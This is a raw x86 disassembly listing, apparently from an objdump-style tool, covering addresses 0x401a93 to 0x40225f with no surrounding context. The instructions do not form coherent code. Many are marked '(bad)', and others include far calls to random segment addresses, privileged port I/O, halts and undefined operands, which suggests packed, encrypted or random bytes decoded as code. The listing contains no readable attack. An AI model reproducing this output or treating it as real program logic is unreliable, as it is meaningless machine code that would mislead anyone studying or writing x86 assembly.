  401a93:	mov    bh,0xc9
  401a95:	and    al,0x45
  401a97:	or     al,0x58
  401a99:	adc    eax,0xde03323
  401a9e:	add    al,ah
  401aa0:	les    edi,FWORD PTR [edx-0x69ad204a]
  401aa6:	jno    0x401b11
  401aa8:	or     BYTE PTR [edx-0x397b65a8],bl
  401aae:	(bad)  
  401aaf:	std    
  401ab0:	inc    edi
  401ab1:	jo     0x401a3e
  401ab3:	div    DWORD PTR [esi+esi*4+0x5]
  401ab7:	mov    ah,0x99
  401ab9:	adc    BYTE PTR [edx-0x12ff8215],dh
  401abf:	dec    ebx
  401ac0:	mov    edx,0x5ae39316
  401ac5:	push   cs
  401ac6:	aas    
  401ac7:	and    edx,0xffffffac
  401aca:	test   eax,0x7d349f70
  401acf:	mov    esi,0x6040e56a
  401ad4:	xchg   ebp,eax
  401ad5:	leave  
  401ad6:	bound  eax,QWORD PTR [edi]
  401ad8:	pop    es
  401ad9:	sbb    cl,BYTE PTR [edx-0x79]
  401adc:	push   edi
  401add:	(bad)  
  401adf:	jns    0x401ac4
  401ae1:	fimul  WORD PTR ds:0x74194814
  401ae7:	retf   0x7911
  401aea:	jl     0x401ab9
  401aec:	cmp    DWORD PTR [eax],ecx
  401aee:	mov    es,WORD PTR [edx+0x3a]
  401af1:	add    eax,0xf48c239c
  401af6:	push   edx
  401af7:	fild   QWORD PTR [ecx+0x45]
  401afa:	js     0x401b30
  401afc:	xchg   esi,eax
  401afd:	cmp    ah,BYTE PTR [ebx+0x2415476d]
  401b03:	jne    0x401b25
  401b05:	(bad)  
  401b06:	clc    
  401b07:	div    DWORD PTR [eax*4+0x7da93a15]
  401b0e:	push   ebx
  401b0f:	clc    
  401b10:	adc    esp,DWORD PTR [edi]
  401b12:	pop    ebx
  401b13:	mov    ecx,0xe6bb2ab6
  401b18:	pop    edi
  401b19:	dec    ebp
  401b1a:	jecxz  0x401ae7
  401b1c:	sub    esp,esi
  401b1e:	inc    edx
  401b1f:	xchg   ebx,eax
  401b20:	dec    ebp
  401b21:	in     eax,0x21
  401b23:	dec    esi
  401b24:	pop    esi
  401b25:	mov    ch,0xa5
  401b27:	cmp    edi,edx
  401b29:	mov    cl,0x69
  401b2b:	hlt    
  401b2c:	pop    esp
  401b2d:	retf   0x9ca0
  401b30:	outs   dx,DWORD PTR ds:[esi]
  401b31:	fsub   DWORD PTR [ebx]
  401b33:	(bad)  
  401b34:	stos   BYTE PTR es:[edi],al
  401b35:	arpl   WORD PTR [ecx],bx
  401b37:	or     BYTE PTR [ebx+0x661c678],dl
  401b3d:	push   ebp
  401b3e:	call   0x15d5:0xf71cdcdf
  401b45:	(bad)  
  401b46:	mov    ebx,0x6cf4d666
  401b4b:	ror    DWORD PTR [edx],cl
  401b4d:	imul   ecx,DWORD PTR [edx],0x4c
  401b50:	xchg   esp,eax
  401b51:	clc    
  401b52:	jmp    0x401bc4
  401b54:	test   eax,0x99309cc
  401b59:	call   0xe7e:0xa0d6a0c2
  401b60:	imul   esp,DWORD PTR [ebx-0xb],0xd2f994b4
  401b67:	arpl   si,ax
  401b69:	dec    DWORD PTR [edi-0xd]
  401b6c:	push   eax
  401b6d:	jno    0x401b0a
  401b6f:	jecxz  0x401b8f
  401b71:	xor    DWORD PTR [eax],0x3f
  401b74:	xchg   DWORD PTR [esi-0x80],eax
  401b77:	lahf   
  401b78:	dec    ecx
  401b79:	in     al,dx
  401b7a:	in     al,0xa4
  401b7c:	mov    ds:0x5fcea7a3,al
  401b81:	call   0x8365:0x388e3530
  401b88:	push   ss
  401b89:	jno    0x401b2a
  401b8b:	test   dh,al
  401b8d:	sbb    bh,BYTE PTR [esi+0x4b9b2282]
  401b93:	push   edi
  401b94:	adc    eax,0x34e92455
  401b99:	jns    0x401b95
  401b9b:	ret    
  401b9c:	les    eax,FWORD PTR [edi+edx*1+0x60af0bcc]
  401ba3:	(bad)  
  401ba4:	ss mov ecx,0xfef5b18d
  401baa:	js     0x401b6c
  401bac:	popf   
  401bad:	jns    0x401c14
  401baf:	bound  ebp,QWORD PTR [ebp-0x1a75e385]
  401bb5:	fs adc eax,0xd4722f96
  401bbb:	shl    esp,0x22
  401bbe:	cmp    al,0x19
  401bc0:	in     eax,dx
  401bc1:	ror    DWORD PTR [ecx-0x7dfa22dc],1
  401bc7:	ror    DWORD PTR [ebp+eax*1-0x29],cl
  401bcb:	hlt    
  401bcc:	inc    ebp
  401bcd:	rol    BYTE PTR ds:0x827cf8a8,0xf2
  401bd4:	fistp  DWORD PTR [ecx-0x481d09f8]
  401bda:	das    
  401bdb:	mov    al,ds:0x913baac5
  401be0:	jge    0x401bf5
  401be2:	mov    eax,0xef60b454
  401be7:	in     eax,dx
  401be8:	vpsubd ymm3,ymm5,ymm7
  401bec:	mov    ds:0xf5cacc11,eax
  401bf1:	push   ss
  401bf2:	imul   esi,DWORD PTR [ecx-0x52],0x4b
  401bf6:	or     DWORD PTR [eax],ebp
  401bf8:	cmp    bl,BYTE PTR [ebp+0x2d410ab5]
  401bfe:	cmp    DWORD PTR [edi],0xa65a1274
  401c04:	pop    es
  401c05:	push   0xe10068e3
  401c0a:	or     al,0xee
  401c0c:	retf   
  401c0d:	xchg   ecx,eax
  401c0e:	sbb    al,0x85
  401c10:	std    
  401c11:	scas   eax,DWORD PTR es:[edi]
  401c12:	cmp    DWORD PTR [edi-0x2e5d251],esp
  401c18:	sub    DWORD PTR [edi],edx
  401c1a:	call   0x561c:0x53bd6419
  401c21:	je     0x401bb8
  401c23:	jae    0x401c6b
  401c25:	inc    eax
  401c26:	mov    ebp,0xdc0adfea
  401c2b:	jmp    0xe288:0x8b4a4bab
  401c32:	xor    al,0x6b
  401c34:	(bad)  
  401c35:	xor    eax,DWORD PTR [ebx+0x2fcef812]
  401c3b:	fisttp QWORD PTR [ecx-0x6]
  401c3e:	jns    0x401c46
  401c40:	idiv   BYTE PTR [edx+0x4b]
  401c43:	(bad)  
  401c46:	inc    esp
  401c47:	add    eax,0xfceb9ec7
  401c4c:	cdq    
  401c4d:	dec    edi
  401c4e:	cmp    eax,DWORD PTR [ecx+0x30b118a3]
  401c54:	outs   dx,DWORD PTR ds:[esi]
  401c55:	ds inc eax
  401c57:	ss leave 
  401c59:	cmp    DWORD PTR [ebp+0x41],edx
  401c5c:	adc    BYTE PTR [ecx+0x11],cl
  401c5f:	cs jnp 0x401caf
  401c62:	das    
  401c63:	add    al,0xce
  401c65:	mov    ds:0xe0f2eeba,eax
  401c6a:	outs   dx,BYTE PTR ds:[esi]
  401c6b:	sti    
  401c6c:	repnz or eax,0xb11d31fe
  401c72:	(bad)  
  401c73:	jmp    0x90e7:0xefa7f2bb
  401c7a:	stc    
  401c7b:	aam    0xa5
  401c7d:	mov    bh,0xd9
  401c7f:	repnz aas 
  401c81:	mov    eax,ds:0x65c0a02f
  401c86:	add    DWORD PTR [edx+esi*8+0x7c3fdd2d],esp
  401c8d:	out    dx,al
  401c8e:	xchg   ecx,eax
  401c8f:	push   ds
  401c90:	sbb    ebp,edx
  401c92:	xchg   edx,eax
  401c93:	mov    esi,0x1d68a886
  401c98:	test   eax,0x4646c54c
  401c9d:	pop    ebp
  401c9e:	cld    
  401c9f:	lods   al,BYTE PTR ds:[esi]
  401ca0:	cwde   
  401ca1:	shr    edi,1
  401ca3:	jl     0x401cf3
  401ca5:	outs   dx,BYTE PTR ds:[esi]
  401ca6:	lods   al,BYTE PTR ds:[esi]
  401ca7:	push   ebp
  401ca8:	xchg   esi,eax
  401ca9:	adc    dh,dl
  401cab:	mov    al,0xa3
  401cad:	mov    ds:0xb2680f8b,eax
  401cb2:	and    cl,BYTE PTR [edi]
  401cb4:	in     eax,0x8f
  401cb6:	jp     0x401c61
  401cb8:	xchg   ecx,eax
  401cb9:	mov    dh,0x29
  401cbb:	mul    DWORD PTR [edi]
  401cbd:	pop    ecx
  401cbe:	sub    dh,bl
  401cc0:	or     eax,DWORD PTR [edx+ebp*1+0x6dca1c1]
  401cc7:	std    
  401cc8:	and    DWORD PTR [esi],ebx
  401cca:	adc    DWORD PTR [ebp*2-0x733aa3be],ebp
  401cd1:	retf   0xef1e
  401cd4:	arpl   WORD PTR [esi+0x3],sp
  401cd7:	aad    0xc4
  401cd9:	cmp    eax,0xcb3cd17e
  401cde:	push   edx
  401cdf:	adc    ebp,DWORD PTR [edx+0x43]
  401ce2:	and    eax,0x5c3e3641
  401ce7:	inc    ebx
  401ce8:	push   edi
  401ce9:	mov    edx,0x953a74f
  401cee:	dec    eax
  401cef:	cdq    
  401cf0:	sub    cl,cl
  401cf2:	adc    DWORD PTR [ebp-0x6e],ebx
  401cf5:	push   ds
  401cf6:	je     0x401d66
  401cf8:	retf   0xdc5
  401cfb:	push   esp
  401cfc:	in     al,dx
  401cfd:	in     eax,dx
  401cfe:	jne    0x401d44
  401d00:	adc    bl,cl
  401d02:	adc    ebx,DWORD PTR [ebx+0x5714b45a]
  401d08:	pop    ebx
  401d09:	pop    esp
  401d0a:	out    0xf0,al
  401d0c:	repnz mov ch,0x69
  401d0f:	add    BYTE PTR [ecx-0x217d7fc9],cl
  401d15:	cwde   
  401d16:	mov    dh,0x5b
  401d18:	mov    cl,dh
  401d1a:	sub    bl,BYTE PTR [esi-0x62fd8180]
  401d20:	cdq    
  401d21:	aaa    
  401d22:	pushf  
  401d23:	add    DWORD PTR [eax+0x5],edx
  401d26:	push   ebx
  401d27:	jl     0x401ced
  401d29:	int    0xe3
  401d2b:	or     BYTE PTR [edi],bl
  401d2d:	dec    ebx
  401d2e:	sub    edx,eax
  401d30:	dec    edx
  401d31:	xchg   BYTE PTR [ebp+0x46],bh
  401d34:	jbe    0x401cd1
  401d36:	div    DWORD PTR [esi-0x23]
  401d39:	faddp  st(1),st
  401d3b:	ins    BYTE PTR es:[edi],dx
  401d3c:	pop    edx
  401d3d:	mov    eax,ds:0xd261b2e2
  401d42:	adc    ebp,esp
  401d44:	push   ds
  401d45:	aad    0x13
  401d47:	push   esp
  401d48:	pusha  
  401d49:	arpl   WORD PTR [esi-0x6d],cx
  401d4c:	dec    ecx
  401d4d:	cld    
  401d4e:	aas    
  401d4f:	sahf   
  401d50:	out    0x9a,al
  401d52:	fs jle 0x401d13
  401d55:	ret    
  401d56:	cmp    BYTE PTR [edi-0x1c],cl
  401d59:	in     al,dx
  401d5a:	aaa    
  401d5b:	call   0x3ddb:0xfdeab48d
  401d62:	fstp   st(3)
  401d64:	fldenv [eax]
  401d66:	sub    al,0x27
  401d68:	or     DWORD PTR [esi-0x2a],eax
  401d6b:	mov    eax,0x229755fd
  401d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d71:	clc    
  401d72:	addr16 nop
  401d74:	push   esp
  401d75:	xchg   esi,eax
  401d76:	arpl   WORD PTR [ebp+ebx*4+0x1dc04690],sp
  401d7d:	inc    ebx
  401d7e:	rcl    DWORD PTR [edi+0x20c29aeb],1
  401d84:	mov    eax,ds:0x5b53ff4e
  401d89:	stc    
  401d8a:	and    BYTE PTR [ecx],al
  401d8c:	pop    es
  401d8d:	mov    esp,0xb4cdab11
  401d92:	pop    esp
  401d93:	fiadd  DWORD PTR ds:0x8361fbe1
  401d99:	dec    edx
  401d9a:	dec    ebp
  401d9b:	add    al,0xb3
  401d9d:	gs arpl di,dx
  401da0:	adc    DWORD PTR [esi+0x34],esi
  401da3:	xchg   BYTE PTR [eax],dl
  401da5:	out    0x5a,eax
  401da7:	push   edx
  401da8:	jbe    0x401dfb
  401daa:	ins    BYTE PTR es:[edi],dx
  401dab:	pushf  
  401dac:	mov    edi,0xf81ce9
  401db1:	out    dx,eax
  401db2:	or     al,0x20
  401db4:	adc    al,0x7a
  401db6:	jmp    0x401e11
  401db8:	ret    0x3257
  401dbb:	or     eax,0x7a585f50
  401dc0:	xor    DWORD PTR ds:0x20e4fc85,edi
  401dc6:	ret    0x1961
  401dc9:	cmp    ebp,DWORD PTR [ebp-0x21afb84f]
  401dcf:	jnp    0x401dde
  401dd1:	push   ebp
  401dd2:	add    esp,edi
  401dd4:	cmp    eax,0xa556f9da
  401dd9:	(bad)  
  401dda:	fld    DWORD PTR [edi-0x6d207865]
  401de0:	(bad)  gs:[edi+0x24]
  401de4:	xor    al,0xf
  401de6:	imul   eax,DWORD PTR [edi+0x6f],0xa39b85cc
  401ded:	shl    BYTE PTR [ebx+ecx*4+0x7c007328],cl
  401df4:	cmp    bl,dh
  401df6:	push   ebp
  401df7:	jnp    0x401e70
  401df9:	out    0xc4,al
  401dfb:	jecxz  0x401e1b
  401dfd:	sub    edi,esi
  401dff:	cmp    esp,DWORD PTR [edx]
  401e01:	mov    ah,0xf
  401e03:	fcom   QWORD PTR [ebp-0x44]
  401e06:	or     ebp,DWORD PTR [edi-0x4a]
  401e09:	imul   BYTE PTR [esi+0x53d1d769]
  401e0f:	mov    ch,0x0
  401e11:	clc    
  401e12:	mov    ecx,DWORD PTR [edx+0x598a0091]
  401e18:	pop    ds
  401e19:	jb     0x401e46
  401e1b:	js     0x401e32
  401e1d:	aad    0x93
  401e1f:	hlt    
  401e20:	dec    esp
  401e21:	add    esp,ebx
  401e23:	add    BYTE PTR [ecx+ebx*4-0x5c],ah
  401e27:	inc    esi
  401e28:	mov    eax,0x8b695dce
  401e2d:	rcl    BYTE PTR [ecx+0x20d08137],1
  401e33:	adc    DWORD PTR [ebp-0x59],eax
  401e36:	jecxz  0x401ea0
  401e38:	cld    
  401e39:	fnstsw WORD PTR [edi]
  401e3b:	adc    ecx,esi
  401e3d:	push   esi
  401e3e:	retf   0xe078
  401e41:	mov    eax,ds:0xa23f8ea
  401e46:	mul    edx
  401e48:	xchg   esi,eax
  401e49:	stos   DWORD PTR es:[edi],eax
  401e4a:	mov    dh,bh
  401e4c:	pusha  
  401e4d:	lods   al,BYTE PTR ds:[esi]
  401e4e:	push   ds
  401e4f:	(bad)  
  401e50:	cdq    
  401e51:	in     al,0x2e
  401e53:	push   0xffffffff
  401e55:	xor    bh,ah
  401e57:	retf   0x9020
  401e5a:	(bad)  
  401e5b:	cmp    cl,dh
  401e5d:	inc    ecx
  401e5e:	jle    0x401e0e
  401e60:	outs   dx,BYTE PTR ds:[esi]
  401e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e62:	jbe    0x401df2
  401e64:	sbb    esp,edi
  401e66:	inc    edx
  401e67:	adc    cl,BYTE PTR ds:0xf79576c9
  401e6d:	add    edx,ebx
  401e6f:	push   ss
  401e70:	adc    BYTE PTR [ecx-0x80],ah
  401e73:	adc    esp,DWORD PTR [esi-0x47394835]
  401e79:	outs   dx,DWORD PTR ds:[esi]
  401e7a:	imul   edx,DWORD PTR [esi+ebx*2],0xe
  401e7e:	das    
  401e7f:	fnstcw WORD PTR [ecx-0x33e01352]
  401e85:	neg    ebx
  401e87:	and    eax,0x658fcc40
  401e8c:	or     ecx,esi
  401e8e:	push   ss
  401e8f:	push   esp
  401e90:	push   ebp
  401e91:	aas    
  401e92:	push   cs
  401e93:	cs jo  0x401e63
  401e96:	adc    BYTE PTR [edx-0x3],ah
  401e99:	stc    
  401e9a:	mov    BYTE PTR [edx+0x10],bh
  401e9d:	int3   
  401e9e:	push   cs
  401e9f:	or     al,0x48
  401ea1:	cld    
  401ea2:	daa    
  401ea3:	sbb    BYTE PTR [ecx+0x69969f92],al
  401ea9:	jbe    0x401ed8
  401eab:	mov    ebp,0x6b801cc8
  401eb0:	and    BYTE PTR [ebx-0x5bbe18e8],0x64
  401eb7:	stos   DWORD PTR es:[edi],eax
  401eb8:	mov    dl,ch
  401eba:	dec    eax
  401ebb:	xor    edi,DWORD PTR [edx+ebx*2-0x4183c86]
  401ec2:	ror    DWORD PTR gs:[ebx-0x16],0xd1
  401ec7:	ret    
  401ec8:	push   cs
  401ec9:	xor    BYTE PTR [esi+eax*2],cl
  401ecc:	jmp    DWORD PTR ds:0x92e7b409
  401ed2:	and    DWORD PTR [eax+0x1a],edx
  401ed5:	sbb    eax,0xf532edd6
  401eda:	data16 stc 
  401edc:	adc    ebp,DWORD PTR ds:0x3ae5b76
  401ee2:	pop    es
  401ee3:	inc    eax
  401ee4:	mov    bl,0x6c
  401ee6:	outs   dx,BYTE PTR ds:[esi]
  401ee7:	mov    edx,DWORD PTR [esi+0x15b52173]
  401eed:	xchg   DWORD PTR [ebx+0x1a943bba],esi
  401ef3:	xchg   ecx,eax
  401ef4:	mul    DWORD PTR [ebx+0x15d4f86b]
  401efa:	test   BYTE PTR [esi+0x275a3e10],0x79
  401f01:	add    al,0xdc
  401f03:	bound  ecx,QWORD PTR [edi+0x2d692b7c]
  401f09:	sub    eax,0xcf8aa13f
  401f0e:	xor    eax,0xd21b4a37
  401f13:	bound  edx,QWORD PTR [ecx-0x48]
  401f16:	adc    al,0xe7
  401f18:	pusha  
  401f19:	repz dec ebx
  401f1b:	add    DWORD PTR [ecx],edi
  401f1d:	push   esi
  401f1e:	test   eax,0xe874a958
  401f23:	jg     0x401f24
  401f25:	xor    BYTE PTR [ebx+eax*2+0x32902451],al
  401f2c:	stc    
  401f2d:	call   0x70e5:0xebd115b4
  401f34:	or     eax,0x27a3a6c4
  401f39:	(bad)  
  401f3a:	or     ch,BYTE PTR [ebp+0x2e4a2ceb]
  401f40:	icebp  
  401f41:	adc    edx,DWORD PTR [esp+ebp*1-0xd6b3d9f]
  401f48:	hlt    
  401f49:	xsavec [ecx-0x43b0a893]
  401f50:	rol    BYTE PTR [ecx],cl
  401f52:	dec    eax
  401f53:	xor    ebp,DWORD PTR [ebx]
  401f55:	ja     0x401fb4
  401f57:	cmp    edx,edx
  401f59:	pop    ds
  401f5a:	test   BYTE PTR [ebp-0x77],bh
  401f5d:	sbb    DWORD PTR [ecx-0x47dfeb14],edx
  401f63:	sub    BYTE PTR [ebx+0xd],0x6
  401f67:	aad    0x8
  401f69:	sahf   
  401f6a:	push   es
  401f6b:	loopne 0x401eff
  401f6d:	retf   
  401f6e:	ss cmp bh,ah
  401f71:	xor    DWORD PTR [ecx-0x6d33b7a3],ecx
  401f77:	in     eax,dx
  401f78:	clc    
  401f79:	mov    ebx,0xa0a66bc3
  401f7e:	ds jg  0x401fb4
  401f81:	fiadd  WORD PTR [ecx+0x51]
  401f84:	pop    ecx
  401f85:	addr16 push ss
  401f87:	adc    al,0xbc
  401f89:	pop    esp
  401f8a:	mov    ecx,0xe8e6b243
  401f8f:	push   esp
  401f90:	xchg   ecx,eax
  401f91:	xor    al,0xf7
  401f93:	mov    eax,0x45431f97
  401f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f99:	out    dx,eax
  401f9a:	cli    
  401f9b:	xchg   cl,al
  401f9d:	fld    TBYTE PTR ds:0xe7a43a6f
  401fa3:	das    
  401fa4:	add    edx,DWORD PTR [eax]
  401fa6:	arpl   WORD PTR [eax],bx
  401fa8:	mov    ch,0x35
  401faa:	frstor [edi-0x3a63b057]
  401fb0:	fsub   st,st(5)
  401fb2:	push   ss
  401fb3:	add    al,0x4f
  401fb5:	add    eax,0x39233c8c
  401fba:	dec    edi
  401fbb:	imul   esi,edx,0xcdde1e17
  401fc1:	inc    ecx
  401fc2:	retf   0x267c
  401fc5:	gs pop esi
  401fc7:	gs pop edi
  401fc9:	imul   esi,DWORD PTR [edi+esi*8],0x6c
  401fcd:	adc    bh,BYTE PTR [eax-0x5c]
  401fd0:	cmp    DWORD PTR [edx],ebx
  401fd2:	push   0xffffffda
  401fd4:	test   DWORD PTR [ebx-0x2a],ecx
  401fd7:	pop    esp
  401fd8:	(bad)  
  401fd9:	jg     0x401ff4
  401fdb:	sbb    DWORD PTR [edx+0x38],0xd
  401fdf:	test   eax,0x61e8a62a
  401fe4:	jecxz  0x402009
  401fe6:	pop    ebx
  401fe7:	into   
  401fe8:	outs   dx,DWORD PTR ds:[esi]
  401fe9:	lods   al,BYTE PTR ds:[esi]
  401fea:	mov    edx,0xa00603e5
  401fef:	dec    esp
  401ff0:	xor    al,0xb9
  401ff2:	fld    QWORD PTR [ebx-0x49]
  401ff5:	lods   eax,DWORD PTR ds:[esi]
  401ff6:	ror    DWORD PTR [ecx-0x6d12d5b9],1
  401ffc:	imul   edx,DWORD PTR [eax+0x55],0x15
  402000:	mov    ds,WORD PTR [ecx]
  402002:	(bad)  
  402003:	loopne 0x402069
  402005:	inc    edi
  402006:	adc    eax,DWORD PTR [edi+0x38356a5]
  40200c:	test   BYTE PTR [esi+0x78],ah
  40200f:	jns    0x401fb4
  402011:	sub    bl,BYTE PTR [eax]
  402013:	das    
  402014:	fimul  WORD PTR [ebx+eiz*8+0x77]
  402018:	inc    ebp
  402019:	hlt    
  40201a:	push   ds
  40201b:	jbe    0x402044
  40201d:	jmp    FWORD PTR [edx]
  40201f:	(bad)  
  402020:	popf   
  402021:	es dec edi
  402023:	xlat   BYTE PTR ds:[ebx]
  402024:	push   0x3cde4b4e
  402029:	inc    esp
  40202a:	mov    dl,0x9
  40202c:	(bad)  
  40202d:	pop    edx
  40202e:	arpl   WORD PTR [edi+0x7b],bx
  402031:	les    ebp,FWORD PTR [ebx+edx*2+0x2d]
  402035:	sahf   
  402036:	retf   
  402037:	dec    eax
  402038:	(bad)  
  402039:	rcl    BYTE PTR [ecx-0xa],1
  40203c:	mov    al,0xfe
  40203e:	cmp    BYTE PTR [eax],al
  402040:	mov    eax,ds:0x2486234d
  402045:	inc    ebx
  402046:	js     0x401fe4
  402048:	push   ds
  402049:	gs push eax
  40204b:	push   ds
  40204c:	data16 cmp BYTE PTR [eax+0x8],dh
  402050:	fdiv   DWORD PTR [esi+esi*4]
  402053:	pop    eax
  402054:	and    BYTE PTR [ebx+0x22],ah
  402057:	test   edx,0x647c5075
  40205d:	into   
  40205e:	ror    DWORD PTR ds:[ebx],0xf7
  402062:	stc    
  402063:	adc    DWORD PTR [esi+0x4d956e68],ebp
  402069:	sbb    edx,ebx
  40206b:	inc    ebx
  40206c:	in     al,dx
  40206d:	or     BYTE PTR ds:0x68594ee6,bh
  402073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402074:	mov    eax,0xdba8023
  402079:	jbe    0x402061
  40207b:	xchg   edx,eax
  40207c:	outs   dx,BYTE PTR ds:[esi]
  40207d:	shl    BYTE PTR [ebx],cl
  40207f:	adc    DWORD PTR [ecx-0x4ff4072a],esi
  402085:	bnd ja 0x402015
  402088:	les    eax,FWORD PTR [eax-0x13]
  40208b:	sub    al,BYTE PTR [eax+eax*8+0x0]
  40208f:	jnp    0x4020bd
  402091:	std    
  402092:	int    0x18
  402094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402095:	and    al,0x68
  402097:	gs mov ebp,0xe86dabe6
  40209d:	inc    eax
  40209e:	and    al,0xe3
  4020a0:	adc    al,0x53
  4020a2:	ficomp WORD PTR [edi-0x7fbed8a3]
  4020a8:	mov    ds:0x582151c5,eax
  4020ad:	inc    edx
  4020ae:	inc    ebx
  4020af:	cs into 
  4020b1:	jecxz  0x402131
  4020b3:	test   BYTE PTR [esi],ch
  4020b5:	jne    0x4020ea
  4020b7:	mov    ecx,0xfe1f421
  4020bc:	push   ecx
  4020bd:	push   esp
  4020be:	pop    eax
  4020bf:	or     dh,dh
  4020c1:	pop    ds
  4020c2:	fldenv ds:0xc78b91aa
  4020c8:	daa    
  4020c9:	dec    ecx
  4020ca:	or     bh,0x8b
  4020cd:	or     DWORD PTR [edx-0x789dc028],ebp
  4020d3:	sti    
  4020d4:	jae    0x40211c
  4020d6:	mov    WORD PTR [ebx+0x64d6fcaf],?
  4020dc:	dec    edx
  4020dd:	fucomi st,st(7)
  4020df:	pop    ebp
  4020e0:	nop
  4020e1:	jmp    0x58358e29
  4020e6:	adc    al,al
  4020e8:	out    0xac,al
  4020ea:	clc    
  4020eb:	jo     0x402155
  4020ed:	scas   eax,DWORD PTR es:[edi]
  4020ee:	outs   dx,DWORD PTR ds:[esi]
  4020ef:	ins    BYTE PTR es:[edi],dx
  4020f0:	pop    ss
  4020f1:	xor    cl,BYTE PTR [edi*2-0x11f47b14]
  4020f8:	and    cl,al
  4020fa:	aas    
  4020fb:	push   ebx
  4020fc:	jp     0x40215e
  4020fe:	pop    ebx
  4020ff:	cmc    
  402100:	cmp    BYTE PTR [esi-0x28],dh
  402103:	int    0xe6
  402105:	pop    esi
  402106:	push   esi
  402107:	push   edi
  402108:	cmc    
  402109:	ja     0x4020d0
  40210b:	lods   eax,DWORD PTR ds:[esi]
  40210c:	cmp    BYTE PTR [ebx],dl
  40210e:	pop    es
  40210f:	sbb    BYTE PTR [edx],dl
  402111:	addr16 jmp 0x75d292ab
  402117:	sub    ebp,DWORD PTR [edi-0x50]
  40211a:	inc    edi
  40211b:	out    dx,al
  40211c:	push   ebp
  40211d:	fcom   DWORD PTR ds:0x8da1951
  402123:	mov    ecx,0xc28ab209
  402128:	call   0x3d1b:0x9e2681de
  40212f:	sub    al,0x3a
  402131:	dec    ecx
  402132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402133:	xor    BYTE PTR [ecx],dh
  402135:	into   
  402136:	aaa    
  402137:	xchg   DWORD PTR ss:[ebx+0x26],edx
  40213b:	and    dh,ch
  40213d:	lahf   
  40213e:	int    0x22
  402140:	sub    cl,BYTE PTR [ebx-0x8]
  402143:	mov    dl,0xd8
  402145:	mov    ?,WORD PTR [edx]
  402147:	and    ecx,esi
  402149:	mov    WORD PTR [esp+ebp*4-0x36b67233],?
  402150:	lock arpl WORD PTR [ebp+0x17],bp
  402154:	arpl   WORD PTR [edi+0x48],si
  402157:	lahf   
  402158:	pop    ss
  402159:	repnz call 0xcce6:0x24597598
  402161:	out    dx,eax
  402162:	jns    0x40211b
  402164:	mov    eax,ds:0xd9682c15
  402169:	jno    0x402160
  40216b:	xchg   edi,eax
  40216c:	lods   al,BYTE PTR ds:[esi]
  40216d:	xor    dl,BYTE PTR [eax+eax*4+0x328d92f9]
  402174:	sbb    DWORD PTR [ebx-0x45],ecx
  402177:	dec    edx
  402178:	sub    cl,dh
  40217a:	ja     0x40211c
  40217c:	mov    ds:0xe7410950,al
  402181:	jb     0x402121
  402183:	(bad)  
  402185:	sbb    ebp,ebx
  402187:	repnz int 0x90
  40218a:	out    0x90,eax
  40218c:	jecxz  0x4021c6
  40218e:	and    eax,0xa8e59f48
  402193:	dec    al
  402195:	sbb    edi,esp
  402197:	dec    esi
  402198:	cmp    BYTE PTR [ecx],0xd2
  40219b:	lods   al,BYTE PTR ds:[esi]
  40219c:	(bad)  
  40219d:	mov    edi,0x6d2f0d85
  4021a2:	cs pop esi
  4021a4:	sbb    DWORD PTR [edi+esi*1],esp
  4021a7:	sbb    DWORD PTR [edx+eiz*2],esi
  4021aa:	fcmovnbe st,st(7)
  4021ac:	addr16 leave 
  4021ae:	mov    al,0x82
  4021b0:	sub    BYTE PTR [ebp-0xaeaf7d2],ch
  4021b6:	neg    BYTE PTR [ebx-0x15]
  4021b9:	shr    edx,0x50
  4021bc:	push   ebp
  4021bd:	mov    bh,0x51
  4021bf:	mov    ds:0x7663defd,eax
  4021c4:	sbb    ch,BYTE PTR [eax-0x464f875a]
  4021ca:	ret    0x8c4b
  4021cd:	into   
  4021ce:	or     BYTE PTR [ebx+0x32],0xd
  4021d2:	test   DWORD PTR [edi+ecx*2],esp
  4021d5:	out    0xd9,eax
  4021d7:	or     BYTE PTR [edx],al
  4021d9:	pusha  
  4021da:	push   ss
  4021db:	sub    BYTE PTR [ecx-0x63],ch
  4021de:	mov    dl,0x87
  4021e0:	stos   DWORD PTR es:[edi],eax
  4021e1:	pop    edx
  4021e2:	fdiv   QWORD PTR [edi-0x45]
  4021e5:	imul   ecx,DWORD PTR [eax+0x6b],0xfffffff1
  4021e9:	sub    edi,DWORD PTR [ebx+0x59]
  4021ec:	arpl   WORD PTR [esi-0x8],cx
  4021ef:	arpl   WORD PTR [ecx],cx
  4021f1:	popf   
  4021f2:	loope  0x4021dc
  4021f4:	or     eax,0xde9fb82
  4021f9:	adc    BYTE PTR [eax+ecx*4],bh
  4021fc:	outs   dx,BYTE PTR ds:[esi]
  4021fd:	sub    al,0xe8
  4021ff:	dec    eax
  402200:	and    eax,0x9c06106d
  402205:	mov    BYTE PTR [edx],cl
  402207:	je     0x402204
  402209:	out    0x8f,al
  40220b:	add    al,0x62
  40220d:	(bad)  
  40220e:	das    
  40220f:	cmovs  esi,DWORD PTR [esi+0x200104f6]
  402216:	pop    ss
  402217:	add    bh,0x1d
  40221a:	pushf  
  40221b:	mov    ecx,0x813e66d9
  402220:	jmp    0x4021c8
  402222:	xchg   esp,eax
  402223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402224:	jnp    0x40225d
  402226:	retf   
  402227:	mov    al,ds:0x82ad914f
  40222c:	mov    ah,0x52
  40222e:	xlat   BYTE PTR ds:[ebx]
  40222f:	in     eax,0xdd
  402231:	ret    0xfe9c
  402234:	pop    eax
  402235:	icebp  
  402236:	mov    dl,0x90
  402238:	jb     0x402282
  40223a:	fstp   st(5)
  40223c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40223d:	pop    edx
  40223e:	push   esi
  40223f:	sub    al,BYTE PTR [ebx-0x495d05b0]
  402245:	sti    
  402246:	lahf   
  402247:	lsl    edi,ax
  40224a:	dec    edi
  40224b:	pop    ds
  40224c:	out    dx,eax
  40224d:	jl     0x4022a3
  40224f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402250:	sub    DWORD PTR [eax-0xe9760f9],ebp
  402256:	stos   BYTE PTR es:[edi],al
  402257:	std    
  402258:	pop    es
  402259:	pusha  
  40225a:	inc    esi
  40225b:	jle    0x4021f6
  40225d:	cmp    ebp,ebx
  40225f:	stc    
